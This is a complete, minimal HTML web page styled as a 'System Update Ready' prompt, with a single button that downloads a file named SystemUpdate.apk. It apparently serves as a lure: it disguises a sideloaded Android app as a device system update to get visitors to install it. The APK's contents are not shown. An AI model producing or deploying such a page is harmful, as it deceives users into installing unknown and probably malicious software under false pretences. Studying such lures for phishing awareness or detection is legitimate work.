<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download App</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
            padding: 20px;
        }
        h1 { font-size: 24px; margin-bottom: 10px; color: #ff3333; }
        p { font-size: 14px; color: #888; margin-bottom: 30px; }
        .download-btn {
            background-color: #ff3333;
            color: white;
            text-decoration: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(255, 51, 51, 0.4);
            transition: transform 0.2s;
        }
        .download-btn:active { transform: scale(0.95); }
    </style>
</head>
<body>
    <h1>System Update Ready</h1>
    <p>Tap the button below to install the update on your device.</p>
    <a href="/SystemUpdate.apk" class="download-btn" download>Download APK</a>
</body>
</html>
